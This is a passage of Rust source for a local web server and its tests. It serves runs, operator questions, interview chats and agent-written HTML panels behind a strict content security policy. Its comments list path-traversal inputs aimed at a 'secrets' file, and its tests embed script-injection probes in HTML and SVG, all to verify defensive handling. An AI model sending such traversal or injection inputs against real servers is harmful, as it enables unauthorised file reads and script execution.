                "chats_rev": revisions.3,
            });
            // Serializing four integers cannot fail; giving up beats looping.
            let Ok(event) = Event::default().event("change").json_data(payload) else {
                break;
            };
            if tx.send(event).await.is_err() {
                break;
            }
        }
    });
    Sse::new(ReceiverStream::new(rx).map(Ok::<Event, Infallible>))
        .keep_alive(KeepAlive::new().interval(KEEPALIVE))
}

/// Change detection token for recorded runs under `runs`.
///
/// Combines the id and `run.json` modification time of each run, so adding,
/// updating, or deleting any run — even an older one — moves the revision and
/// notifies connected clients via the change stream. Returns 0 when no runs
/// exist.
fn runs_revision(runs: &FsPath) -> u64 {
    use std::hash::{Hash as _, Hasher as _};

    let mut entries: Vec<(String, u64)> = std::fs::read_dir(runs)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let path = e.path().join("run.json");
            let mtime = path
                .metadata()
                .ok()?
                .modified()
                .ok()?
                .duration_since(std::time::UNIX_EPOCH)
                .ok()?
                .as_millis() as u64;
            let id = e.file_name().to_string_lossy().into_owned();
            Some((id, mtime))
        })
        .collect();

    if entries.is_empty() {
        return 0;
    }

    entries.sort_unstable();
    let mut hasher = std::hash::DefaultHasher::new();
    for (id, mtime) in &entries {
        id.hash(&mut hasher);
        mtime.hash(&mut hasher);
    }
    let h = hasher.finish();
    if h == 0 { 1 } else { h }
}

/// Run ids under `runs`, newest first.
///
/// Rooted at an explicit directory rather than calling [`run::list_ids`],
/// which reads the process-global home: the server has to be drivable against
/// a temp directory for any of this to be testable.
fn run_ids(runs: &FsPath) -> Vec<String> {
    let mut ids: Vec<String> = std::fs::read_dir(runs)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.path().join("run.json").is_file())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    // Ids start with a sortable timestamp.
    ids.sort_unstable_by(|a, b| b.cmp(a));
    ids
}

/// Read one run's state from an explicit runs root.
fn read_run(runs: &FsPath, id: &str) -> Result<RunState> {
    let path = runs.join(id).join("run.json");
    let body =
        std::fs::read_to_string(&path).with_context(|| format!("read {}", path.display()))?;
    let state: RunState =
        serde_json::from_str(&body).with_context(|| format!("parse {}", path.display()))?;
    if state.schema != run::SCHEMA {
        anyhow::bail!(
            "run {} was written by a different magi (schema {}, this build speaks {})",
            state.id,
            state.schema,
            run::SCHEMA
        );
    }
    Ok(state)
}

/// Runs on disk under `runs` whose state this build cannot parse - almost
/// always a schema bump, occasionally a run killed mid-write.
///
/// Exposed so every surface that reports on runs shares one count instead of
/// each re-deriving it: `/api/health` reports it as `runs_unreadable`, and
/// `magi doctor` calls this directly rather than guessing at the same number
/// a second way.
#[must_use]
pub fn runs_unreadable(runs: &FsPath) -> usize {
    run_ids(runs)
        .into_iter()
        .filter(|id| read_run(runs, id).is_err())
        .count()
}

/// Expand an id or short id to exactly one run id.
fn resolve_run(runs: &FsPath, id: &str) -> ApiResult<String> {
    if runs.join(id).join("run.json").is_file() {
        return Ok(id.to_owned());
    }
    pick(run_ids(runs), id, "run")
}

/// Expand an id or short id to exactly one task id.
fn resolve_task(queue: &Queue, id: &str) -> ApiResult<String> {
    if queue.path_of(id).is_file() {
        return Ok(id.to_owned());
    }
    pick(queue.list().into_iter().map(|t| t.id).collect(), id, "task")
}

/// `GET /api/questions`.
///
/// Everything, not just the open ones: an answered question is the record of a
/// decision, and the phone is where the operator goes back to check what they
/// told an agent at 3am. `ask::Questions::list` already ranks open first.
async fn questions_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<Question>>> {
    blocking(move || Ok(Json(ui.questions.list()))).await
}

/// The body of `POST /api/questions/{id}/answer`.
///
/// Exactly one of the two fields, mirroring `ask::Answer`. Both or neither is
/// a bad request rather than a guess: an answer magi invented is worse than a
/// question left open.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct NewAnswer {
    choice: Option<String>,
    text: Option<String>,
}

async fn question_answer(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<NewAnswer>, axum::extract::rejection::JsonRejection>,
) -> ApiResult<Json<Question>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    let answer = match (body.choice, body.text) {
        (Some(c), None) => Answer::Choice(c),
        (None, Some(t)) => Answer::Text(t),
        (Some(_), Some(_)) => {
            return Err(ApiError::bad_request(
                "send either `choice` or `text`, not both",
            ));
        }
        (None, None) => {
            return Err(ApiError::bad_request("send a `choice` or a `text`"));
        }
    };

    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let mut q = ui
            .questions
            .get(&id)
            .map_err(|e| ApiError::from(e).with_status(StatusCode::INTERNAL_SERVER_ERROR))?;
        if !q.status.open() {
            // Answered from the terminal, or by another phone, in between the
            // list and the tap. The UI shows the recorded answer rather than an
            // error, so it needs the record, not just the status.
            return Err(ApiError::conflict(format!(
                "question {} is already {}",
                q.short(),
                q.status.as_str()
            )));
        }
        // `Question::answer` owns the rules - an unoffered choice, free text on
        // a multiple-choice question, an empty reply - so the route does not
        // restate them and cannot drift from the CLI's behaviour.
        q.answer(answer).map_err(ApiError::bad_request_from)?;
        ui.questions.put(&mut q)?;
        Ok(Json(q))
    })
    .await
}

/// Expand an id or short id to exactly one question id.
fn resolve_question(store: &Questions, id: &str) -> ApiResult<String> {
    if store.path_of(id).is_file() {
        return Ok(id.to_owned());
    }
    pick(
        store.list().into_iter().map(|q| q.id).collect(),
        id,
        "question",
    )
}

/// `GET /api/questions/{id}/panel`.
///
/// The panel an agent wrote for this question, as `text/html` under
/// [`PANEL_CSP`], for the front end to mount in a token-less sandboxed iframe.
/// A question without one is a 404 rather than an empty page: the client
/// preflights this route with `HEAD` and must be able to tell "no panel" from
/// "a panel that rendered blank", and a sandboxed frame is opaque to the
/// parent document so it cannot tell the difference by looking.
///
/// The body is whatever the agent wrote, byte for byte. Nothing here rewrites,
/// sanitises or minifies it - a sanitiser is a list of things someone thought
/// of, and the sandbox plus the CSP is a list of things that are allowed, which
/// is the direction that stays safe when an agent writes markup nobody
/// predicted.
async fn question_panel(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Response> {
    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let Some(html) = ui.questions.panel_html(&id) else {
            return Err(ApiError::not_found(format!("question {id} has no panel")));
        };
        Ok(panel_response(
            "text/html; charset=utf-8",
            false,
            html.into_bytes(),
        ))
    })
    .await
}

/// `GET /api/questions/{id}/asset/{name}`.
///
/// One file from the question's own panel directory, so a panel can show a
/// diff as an SVG or a screenshot as a PNG without the CSP's `img-src 'self'`
/// having to allow anything off this machine.
///
/// This is the only route in the server where a client names a file, so it is
/// the only one with a traversal surface, and the name is checked by
/// [`ask::valid_asset_name`] before a path is built from it. Which layer stops
/// what is worth being explicit about, because the answer is not "all of it in
/// one place":
///
/// * `asset/../../secrets` never reaches this handler at all. axum matches on
///   the raw request path and `{name}` spans exactly one segment, so a real
///   slash makes the request too long for the route and the router answers 404.
/// * `asset/%2e%2e%2fsecrets` and `asset/..%5csecrets` do reach it: axum
///   percent-decodes path parameters, so `name` arrives as `../secrets` and
///   `..\secrets` respectively, which look like plain filenames to the router.
///   The validator refuses them here - both for the literal `..` and because
///   `/` and `\` are not in the permitted character set - and answers 400.
/// * A name carrying a NUL (`%00`) decodes to a string Rust is happy with but
///   the platform's path API is not, and it is refused here for the same
///   reason: NUL is not a permitted character.
/// * [`Questions::panel_asset`] validates again on read, so the check is not
///   load-bearing in only one place. This route's own check exists so the
///   failure is a 400 that says which name was wrong, rather than a store error
///   the operator has to interpret.
async fn question_asset(
    State(ui): State<Arc<Ui>>,
    Path((id, name)): Path<(String, String)>,
) -> ApiResult<Response> {
    // Before any filesystem work and before any path is built: a name this
    // server will not serve should not become a `PathBuf` at all.
    if !crate::ask::valid_asset_name(&name) {
        return Err(ApiError::bad_request(format!(
            "`{name}` is not a usable asset name"
        )));
    }
    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let asset = ui
            .questions
            .panel_asset(&id, &name)
            .map_err(|e| ApiError::bad_request(format!("{e:#}")))?;
        let Some(bytes) = asset else {
            return Err(ApiError::not_found(format!(
                "question {id} has no asset `{name}`"
            )));
        };
        Ok(panel_response(
            asset_content_type(&name),
            is_svg(&name),
            bytes,
        ))
    })
    .await
}

/// Content type for a panel asset, from a closed whitelist.
///
/// A whitelist with an `application/octet-stream` fallback rather than a
/// guess, because the one answer that must never come out of here is
/// `text/html`. An agent that writes `notes.html` into its panel directory and
/// links it would otherwise get its own markup rendered at the top level of the
/// operator's browser - outside the sandboxed frame, outside [`PANEL_CSP`], on
/// magi's origin - which is precisely the thing the panel design exists to
/// prevent. Same reasoning for `.js` and `.json`: unlisted means downloaded.
///
/// `nosniff` accompanies this on every response, so a browser cannot decide it
/// knows better than the type we sent.
fn asset_content_type(name: &str) -> &'static str {
    match extension(name).as_deref() {
        Some("png") => "image/png",
        Some("jpg" | "jpeg") => "image/jpeg",
        Some("gif") => "image/gif",
        Some("webp") => "image/webp",
        Some("svg") => "image/svg+xml",
        Some("css") => "text/css; charset=utf-8",
        Some("txt") => "text/plain; charset=utf-8",
        _ => "application/octet-stream",
    }
}

/// Is this an SVG, and therefore a file that must never be opened at the top
/// level?
fn is_svg(name: &str) -> bool {
    extension(name).as_deref() == Some("svg")
}

/// Lowercased extension, or `None` for a name without one.
fn extension(name: &str) -> Option<String> {
    name.rsplit_once('.')
        .map(|(_, ext)| ext.to_ascii_lowercase())
}

/// Every panel response, with the four headers that make it safe and, for an
/// SVG, a fifth.
///
/// One function rather than a header list per handler, because a panel route
/// that forgets [`PANEL_CSP`] is not a cosmetic bug: it is the whole security
/// model gone, silently, on one of two routes. Adding a third panel route later
/// means calling this, and there is nowhere else to build a panel response.
///
/// `download` is set for SVG only. An SVG is XML that may carry `<script>`, and
/// as an `<img src>` inside the panel that script cannot run - but the asset
/// URL is also a plain URL an operator can be talked into opening in a tab,
/// where it is a document on magi's own origin. `Content-Disposition:
/// attachment` makes the browser download it instead of rendering it, which
/// closes that door without taking away the ability to draw a diff. Raster
/// images have no such execution surface and are left inline, so tapping a
/// screenshot still shows it.
fn panel_response(content_type: &'static str, download: bool, body: Vec<u8>) -> Response {
    let mut res = (
        [
            (header::CONTENT_TYPE, content_type),
            (header::CONTENT_SECURITY_POLICY, PANEL_CSP),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
            (header::REFERRER_POLICY, "no-referrer"),
        ],
        body,
    )
        .into_response();
    if download {
        res.headers_mut().insert(
            header::CONTENT_DISPOSITION,
            HeaderValue::from_static("attachment"),
        );
    }
    res
}

/// `GET /api/chats`.
///
/// Every interview, open ones first and newest first, which is
/// [`Chats::list`]'s own order. The whole record including the transcript: a
/// conversation is a few kilobytes, the phone renders it directly, and a
/// summary here would mean a second round trip to read the only thing a chat
/// is made of.
async fn chats_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<Chat>>> {
    blocking(move || Ok(Json(ui.chats.list()))).await
}

async fn chat_detail(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Json<Chat>> {
    blocking(move || {
        let id = resolve_chat(&ui.chats, &id)?;
        Ok(Json(ui.chats.get(&id)?))
    })
    .await
}

/// The body of `POST /api/chats`.
///
/// `agent` names a seat from the roster to do the interviewing; absent means
/// the configured default, which is what the phone sends. Unknown fields are
/// ignored so a newer front end still starts an interview against an older
/// binary.
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct NewChat {
    idea: String,
    agent: Option<String>,
}

/// `POST /api/chats`.
///
/// Starting an interview runs the first agent turn, so this is as slow as
/// [`chat_say`] and is async for the same reason. There is no turn guard yet
/// because there is no chat yet: the id does not exist until [`chat::start`]
/// returns, so two taps produce two separate interviews rather than two turns
/// in one. Two interviews are recoverable - abandon one - where two interleaved
/// turns are not.
async fn chat_post(
    State(ui): State<Arc<Ui>>,
    body: std::result::Result<Json<NewChat>, JsonRejection>,
) -> ApiResult<impl IntoResponse> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    if body.idea.trim().is_empty() {
        return Err(ApiError::bad_request(
            "an interview needs something to interview about",
        ));
    }

    // Read the configuration for this request rather than at startup, so an
    // edit to `magi.toml` - a new seat, a different interviewer - takes effect
    // without restarting the server the operator reaches from their phone.
    let repo = ui.repo.clone();
    let cfg = config_for(&repo).await?;
    let chat = chat::start(&ui.chats, &cfg, repo, &body.idea, body.agent.as_deref())
        .await
        .map_err(ApiError::from)?;
    Ok((StatusCode::CREATED, Json(chat)))
}

/// The body of `POST /api/chats/{id}/say`.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct NewTurn {
    text: String,
}

/// `POST /api/chats/{id}/say` - one turn of the interview.
///
/// The one handler here that is not filesystem work, and therefore the one
/// that must not go through [`blocking`]: it spawns an agent CLI and waits tens
/// of seconds for a paragraph. Sitting on an executor thread for that long
/// would starve the change stream of every other connected phone, which is the
/// opposite of what `blocking` is for. It holds no lock across the `await`
/// either - the turn slot is a set membership, not a mutex guard - so nothing
/// else in the server is delayed by a slow interview.
///
/// What the operator sees while it runs: a request outstanding for the whole
/// turn, with no partial output, because the agent CLIs magi drives return one
/// answer at the end rather than a stream. On a phone that means the composer
/// stays pending for up to the seat's timeout. There is deliberately no
/// progress channel to invent one from; the SSE `chats_rev` bump is the signal
/// that the turn landed, and it fires from the file `chat::say` wrote, so a
/// phone whose radio slept through the reply still learns about it.
///
/// A failed turn is still a turn. [`chat::say`] records the operator's message
/// and an agent turn explaining the failure before it returns an error, so this
/// answers 200 with the conversation: that recorded explanation is the thing
/// the operator needs to read, and a 5xx would make the front end show a
/// generic banner and hide it. The guard against that being a lie is the turn
/// count - if the transcript did not grow, nothing happened and the error is
/// reported as one.
async fn chat_say(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<NewTurn>, JsonRejection>,
) -> ApiResult<Json<Chat>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    if body.text.trim().is_empty() {
        return Err(ApiError::bad_request("say something"));
    }

    let id = {
        let ui = Arc::clone(&ui);
        let asked = id.clone();
        blocking(move || resolve_chat(&ui.chats, &asked)).await?
    };
    // Claimed before the chat is loaded, so the record this turn appends to was
    // read after the claim and cannot be a snapshot another turn has since
    // replaced.
    let _turn = ui.begin_turn(&id)?;

    let (mut chat, cfg) = {
        let ui = Arc::clone(&ui);
        let id = id.clone();
        blocking(move || {
            let chat = ui.chats.get(&id)?;
            let (cfg, _) = Config::discover(&chat.repo, None)?;
            Ok((chat, cfg))
        })
        .await?
    };

    let before = chat.turns.len();
    if let Err(e) = chat::say(&mut chat, &ui.chats, &cfg, &body.text).await {
        // The detail goes to the operator's terminal; the phone gets the
        // transcript, which `say` has already made self-explaining.
        tracing::warn!("chat {id} turn failed: {e:#}");
        let reloaded = {
            let ui = Arc::clone(&ui);
            let id = id.clone();
            blocking(move || Ok(ui.chats.get(&id)?)).await?
        };
        if reloaded.turns.len() <= before {
            // Nothing was recorded, so the request achieved nothing and must
            // not look like it did.
            return Err(ApiError::internal(format!("{e:#}")));
        }
        return Ok(Json(reloaded));
    }
    Ok(Json(chat))
}

/// The body of `POST /api/chats/{id}/file`, which the phone sends empty.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct FileDraft {
    priority: i32,
}

/// `POST /api/chats/{id}/file` - validate the agent's draft and queue it.
///
/// The 400 carries every problem [`chat::draft_problems`] found, as an array
/// beside the usual message, because the operator fixing them is on a phone:
/// one problem per round trip would mean asking the interviewer to rewrite the
/// draft three times for what is one edit.
async fn chat_file(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<FileDraft>, JsonRejection>,
) -> ApiResult<Json<serde_json::Value>> {
    // An absent body is the normal case - the front end posts with no content
    // type at all - and means the default priority. A body that is present and
    // malformed is still a bad request, because silently filing at the wrong
    // priority is worse than saying no.
    let body = match body {
        Ok(Json(body)) => body,
        Err(JsonRejection::MissingJsonContentType(_)) => FileDraft::default(),
        Err(e) => return Err(ApiError::bad_request(e.body_text())),
    };

    blocking(move || {
        let id = resolve_chat(&ui.chats, &id)?;
        let mut chat = ui.chats.get(&id)?;
        // Asked before filing so the answer can be the whole list. `file_draft`
        // applies the same rule and would refuse too, but only with a flattened
        // string, and re-splitting an error message to rebuild the list is the
        // kind of thing that breaks the day someone adds a comma.
        if let Err(problems) = chat::draft_problems(&chat) {
            return Err(ApiError::bad_request_with(
                "the draft is not fileable yet",
                problems,
            ));
        }
        let task = chat::file_draft(&mut chat, &ui.chats, &ui.queue, body.priority)?;
        Ok(Json(serde_json::json!({ "task": task })))
    })
    .await
}

/// Expand an id or short id to exactly one chat id.
fn resolve_chat(store: &Chats, id: &str) -> ApiResult<String> {
    pick(store.list().into_iter().map(|c| c.id).collect(), id, "chat")
}

/// The configuration for a repository, read off the disk for this request.
///
/// Through [`blocking`] because discovery reads and merges several TOML files,
/// and because the alternative - caching it in [`Ui`] at startup - would mean
/// the operator's phone kept interviewing with a roster they had already
/// changed, with no way to reload it but restarting the server they are not
/// sitting in front of.
async fn config_for(repo: &FsPath) -> ApiResult<Config> {
    let repo = repo.to_path_buf();
    blocking(move || {
        let (cfg, _) = Config::discover(&repo, None)?;
        Ok(cfg)
    })
    .await
}

/// The one prefix rule, used for both runs and tasks: a leading match for a
/// full id, a trailing match for the short form an operator reads off a
/// report. Written here rather than borrowed from `queue::resolve_id` because
/// the UI needs the two failures as different status codes, and telling them
/// apart from an error message is not something to build a route on.
fn pick(ids: Vec<String>, prefix: &str, what: &str) -> ApiResult<String> {
    let mut hits = ids
        .into_iter()
        .filter(|id| id.starts_with(prefix) || id.ends_with(prefix));
    match (hits.next(), hits.next()) {
        (Some(one), None) => Ok(one),
        (None, _) => Err(ApiError::not_found(format!("no {what} matches `{prefix}`"))),
        (Some(a), Some(b)) => Err(ApiError::bad_request(format!(
            "`{prefix}` matches more than one {what}, including {a} and {b}"
        ))),
    }
}

#[cfg(test)]
mod tests {
    use pretty_assertions::assert_eq;
    use serde_json::Value;
    use tempfile::TempDir;
    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};

    use super::*;
    use crate::config::Config;
    use crate::queue::TaskStatus;

    /// A home with a queue and a runs directory, and a router serving it on
    /// loopback. `tower`'s `oneshot` is not reachable - `tower` is axum's
    /// dependency, not ours - so the tests drive a real socket, which has the
    /// side benefit of asserting the status line and content types the phone
    /// actually receives.
    struct Fixture {
        home: TempDir,
        addr: SocketAddr,
    }

    impl Fixture {
        async fn start() -> Self {
            let home = TempDir::new().expect("temp home");
            let addr = Self::serve(home.path()).await;
            Self { home, addr }
        }

        async fn serve(home: &FsPath) -> SocketAddr {
            let queue = Queue::at(home.join("queue"));
            let runs = home.join("runs");
            std::fs::create_dir_all(&runs).expect("runs dir");
            let ui = Ui::new(
                queue,
                Questions::at(home.join("questions")),
                Chats::at(home.join("chats")),
                runs,
                home.to_path_buf(),
                PathBuf::from("/repo/magi"),
            );
            let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
                .await
                .expect("bind loopback");
            let addr = listener.local_addr().expect("local addr");
            tokio::spawn(async move {
                let _ = axum::serve(listener, ui.router()).await;
            });
            addr
        }

        fn queue(&self) -> Queue {
            Queue::at(self.home.path().join("queue"))
        }

        fn questions(&self) -> Questions {
            Questions::at(self.home.path().join("questions"))
        }

        fn chats(&self) -> Chats {
            Chats::at(self.home.path().join("chats"))
        }

        fn runs(&self) -> PathBuf {
            self.home.path().join("runs")
        }

        async fn get(&self, path: &str) -> Res {
            request(self.addr, "GET", path, None).await
        }

        /// The status and headers without the body, which is how the front end
        /// preflights a panel: a sandboxed frame is opaque to the parent
        /// document, so the only way to tell "no panel" from "a panel that
        /// rendered blank" is to ask before mounting.
        async fn head(&self, path: &str) -> Res {
            request(self.addr, "HEAD", path, None).await
        }

        async fn post(&self, path: &str, body: Option<&str>) -> Res {
            request(self.addr, "POST", path, body).await
        }

        async fn delete(&self, path: &str) -> Res {
            request(self.addr, "DELETE", path, None).await
        }
    }

    struct Res {
        status: u16,
        headers: String,
        /// The header block with its original casing, for the assertions that
        /// compare a header *value* rather than looking for a name. Lowercasing
        /// a CSP would hide a directive spelled with a capital letter, and the
        /// whole point of that test is that the string is exactly right.
        head: String,
        body: String,
        /// The body before any UTF-8 handling, for the routes that serve
        /// something other than text. A panel asset is a PNG as often as not,
        /// and `from_utf8_lossy` would silently replace half of it.
        bytes: Vec<u8>,
    }

    impl Res {
        fn json(&self) -> Value {
            serde_json::from_str(&self.body)
                .unwrap_or_else(|e| panic!("body is not json ({e}): {}", self.body))
        }

        /// One header's value verbatim, or `None` when it was not sent.
        fn header(&self, name: &str) -> Option<&str> {
            self.head.lines().find_map(|line| {
                let (key, value) = line.split_once(':')?;
                key.trim()
                    .eq_ignore_ascii_case(name)
                    .then(|| value.trim_start().trim_end_matches('\r'))
            })
        }
    }

    /// A one-shot HTTP/1.1 client. `Connection: close` is what lets the reply
    /// be read to end-of-stream without parsing framing.
    async fn request(addr: SocketAddr, method: &str, path: &str, body: Option<&str>) -> Res {
        let mut head = format!("{method} {path} HTTP/1.1\r\nHost: magi\r\nConnection: close\r\n");
        if let Some(body) = body {
            head.push_str("Content-Type: application/json\r\n");
            head.push_str(&format!("Content-Length: {}\r\n", body.len()));
        }
        head.push_str("\r\n");
        if let Some(body) = body {
            head.push_str(body);
        }
        let mut socket = tokio::net::TcpStream::connect(addr)
            .await
            .expect("connect to the test server");
        socket
            .write_all(head.as_bytes())
            .await
            .expect("write request");
        let mut raw = Vec::new();
        socket.read_to_end(&mut raw).await.expect("read response");
        // Split on the raw bytes rather than on a lossy string, so a binary
        // body survives to be compared byte for byte.
        let split = raw
            .windows(4)
            .position(|w| w == b"\r\n\r\n")
            .expect("a header block");
        let head = String::from_utf8_lossy(&raw[..split]).into_owned();
        let bytes = raw[split + 4..].to_vec();
        let status = head
            .lines()
            .next()
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|code| code.parse().ok())
            .expect("a status line");
        Res {
            status,
            headers: head.to_lowercase(),
            head,
            body: String::from_utf8_lossy(&bytes).into_owned(),
            bytes,
        }
    }

    /// A run on disk, without touching the process-global magi home.
    fn write_run(runs: &FsPath, id: &str, status: RunStatus) {
        let mut state = RunState::new(
            PathBuf::from("/repo/magi"),
            "main".to_owned(),
            "0123456789abcdef".to_owned(),
            "Add a web UI\n\nMobile first.".to_owned(),
            Config::default(),
        );
        state.id = id.to_owned();
        state.status = status;
        let dir = runs.join(id);
        std::fs::create_dir_all(&dir).expect("run dir");
        std::fs::write(
            dir.join("run.json"),
            serde_json::to_string_pretty(&state).expect("serialize run"),
        )
        .expect("write run.json");
    }

    fn write_daemon(home: &FsPath, updated_at: Timestamp) {
        let body = serde_json::json!({
            "schema": 1,
            "pid": 4242,
            "started_at": Timestamp::now().to_string(),
            "updated_at": updated_at.to_string(),
            "idle": false,
            "current": { "task": "20260902-140501-aaaa", "run": "20260902-140502-bbbb" },
            "completed": 7,
            "polls": 143,
        });
        std::fs::write(home.join("daemon.json"), body.to_string()).expect("write daemon.json");
    }

    /// File an open question directly in the store the server reads.
    fn ask(fx: &Fixture, summary: &str, choices: &[&str]) -> String {
        let store = fx.questions();
        let mut q = Question::new(
            "20260902-000000-beef".to_owned(),
            "implement".to_owned(),
            "impl-A".to_owned(),
            summary.to_owned(),
            "because it matters".to_owned(),
            choices.iter().map(|c| (*c).to_owned()).collect(),
        );
        store.put(&mut q).expect("put question");
        q.id
    }

    /// A question with a panel the server can serve, plus the named assets.
    ///
    /// Written through `Questions::put_panel` rather than by laying out the
    /// directory here, so these tests exercise the same on-disk shape the
    /// agents produce and cannot pass against a layout only the tests know.
    fn panel(fx: &Fixture, html: &str, assets: &[(&str, &[u8])]) -> String {
        let store = fx.questions();
        let mut q = Question::new(
            "20260902-000000-beef".to_owned(),
            "land".to_owned(),
            "fix".to_owned(),
            "Merge this?".to_owned(),
            "the diff is in the panel".to_owned(),
            vec!["merge".to_owned(), "hold".to_owned()],
        );
        // Staged outside the questions root, because `put_panel` copies from
        // wherever the agent left its files.
        let staging = fx.home.path().join("staging");
        std::fs::create_dir_all(&staging).expect("staging dir");
        let sources: Vec<PathBuf> = assets
            .iter()
            .map(|(name, bytes)| {
                let path = staging.join(name);
                std::fs::write(&path, bytes).expect("write staged asset");
                path
            })
            .collect();
        store
            .put_panel(&mut q, html, &sources)
            .expect("write the panel");
        store.put(&mut q).expect("put question");
        q.id
    }

    /// An interview on disk, without talking to a model.
    ///
    /// Written as JSON straight into the store the server reads, because the
    /// only constructor `chat` offers spawns an agent CLI. The one thing this
    /// cannot make up is the seat, so it is built with the real
    /// `SeatState::new` and serialized - the alternative, hand-writing that
    /// object, would make these tests fail the day the seat gains a field.
    fn interview(fx: &Fixture, id: &str, status: &str, draft: Option<&str>) -> String {
        let store = fx.chats();
        std::fs::create_dir_all(store.root()).expect("chats dir");
        let seat = serde_json::to_value(crate::agent::SeatState::new("plan", "sonnet", 7))
            .expect("serialize a seat");
        let body = serde_json::json!({
            "schema": 1,
            "id": id,
            "repo": "/repo/magi",
            "agent": "sonnet",
            "status": status,
            "turns": [
                { "who": "operator", "body": "rework the config loader",
                  "at": Timestamp::now().to_string() },
                { "who": "agent", "body": "Which part is hurting?",
                  "at": Timestamp::now().to_string() },
            ],
            "draft": draft,
            "task": Value::Null,
            "created_at": Timestamp::now().to_string(),
            "updated_at": Timestamp::now().to_string(),
            "seat": seat,
        });
        std::fs::write(store.path_of(id), body.to_string()).expect("write the chat");
        // A chat the server cannot parse would make every assertion below a
        // 500 that says nothing about the route under test.
        store.get(id).expect("the seeded chat has to be readable");
        id.to_owned()
    }

    /// A task file that satisfies `plan::review_draft`, so `POST /file` has
    /// something to accept.
    fn good_draft() -> String {
        "# Rework the config loader\n\n\
         ## Why\n\n\
         It re-reads `magi.toml` on every lookup, so a run that asks for the \
         roster four hundred times pays four hundred parses of the same file.\n\n\
         ## What\n\n\
         Load the layers once when the run starts and hand the merged value \
         around. Nothing about the file format changes.\n\n\
         ## Acceptance criteria\n\n\
         - `Config::discover` is called exactly once per run.\n\
         - `cargo test` passes with no change to any existing assertion.\n"
            .to_owned()
    }

    #[tokio::test]
    async fn both_panel_routes_send_the_whole_policy_that_makes_agent_html_safe() {
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<h1>Merge?</h1><img src=\"diff.svg\">",
            &[("diff.svg", b"<svg xmlns='http://www.w3.org/2000/svg'/>")],
        );

        for path in [
            format!("/api/questions/{id}/panel"),
            format!("/api/questions/{id}/asset/diff.svg"),
        ] {
            let res = fx.get(&path).await;
            assert_eq!(res.status, 200, "{path}: {}", res.body);
            // The whole string, not a substring. A weakened directive - an
            // `img-src *` that lets a panel beacon out to a remote host, a
            // `script-src` anything, a missing `form-action` that lets it post
            // the owner's decision to a third party - has to fail here, and a
            // `contains` assertion would let every one of those through.
            assert_eq!(
                res.header("content-security-policy"),
                Some(
                    "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
                     font-src data:; base-uri 'none'; form-action 'none'; \
                     frame-ancestors 'self'"
                ),
                "{path} is the only thing between a hostile panel and the tailnet"
            );
            assert_eq!(
                res.header("x-content-type-options"),
                Some("nosniff"),
                "{path}: a browser must not re-decide the type we sent"
            );
            assert_eq!(
                res.header("referrer-policy"),
                Some("no-referrer"),
                "{path}: a panel must not leak the question id off the machine"
            );

            // The front end mounts the frame only after a `HEAD` says the
            // panel is there, so `HEAD` has to answer with the same status and
            // the same policy as `GET` - a preflight that came back without
            // the CSP would mean a frame mounted on an unverified promise.
            let pre = fx.head(&path).await;
            assert_eq!(pre.status, res.status, "{path}: HEAD must agree with GET");
            assert_eq!(
                pre.header("content-security-policy"),
                res.header("content-security-policy"),
                "{path}: the preflight carries the same policy"
            );
            assert_eq!(
                pre.header("content-type"),
                res.header("content-type"),
                "{path}: the preflight carries the same type"
            );
        }
    }

    #[tokio::test]
    async fn a_panel_reaches_the_browser_byte_for_byte() {
        let fx = Fixture::start().await;
        // Markup a sanitiser would be tempted to touch: a stray `<`, a script
        // tag, an entity, and a multi-byte character. The sandbox is what makes
        // this safe, so nothing here may be rewritten on the way out - a
        // rewritten diff is a diff the owner cannot trust.
        let html = "<h1>Merge?</h1><p>a &lt; b — 変更</p><script>alert(1)</script>";
        let id = panel(&fx, html, &[]);

        let res = fx.get(&format!("/api/questions/{id}/panel")).await;

        assert_eq!(res.status, 200);
        assert_eq!(res.bytes, html.as_bytes(), "served verbatim, not sanitised");
        assert_eq!(res.header("content-type"), Some("text/html; charset=utf-8"));
        assert_eq!(
            res.header("content-disposition"),
            None,
            "the panel itself is rendered in the frame, not downloaded"
        );
    }

    #[tokio::test]
    async fn an_svg_asset_is_a_download_and_a_png_is_not() {
        let fx = Fixture::start().await;
        let svg = b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>";
        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR".as_slice();
        let id = panel(
            &fx,
            "<img src=\"diff.svg\"><img src=\"shot.png\">",
            &[("diff.svg", svg), ("shot.png", png)],
        );

        let as_svg = fx.get(&format!("/api/questions/{id}/asset/diff.svg")).await;
        let as_png = fx.get(&format!("/api/questions/{id}/asset/shot.png")).await;

        assert_eq!(as_svg.status, 200);
        assert_eq!(as_svg.header("content-type"), Some("image/svg+xml"));
        // An SVG is XML that may carry script. Inside the panel it is an
        // `<img src>` and the script cannot run; opened at the top level it
        // would be a document on magi's own origin, so the browser is told to
        // download it instead of rendering it.
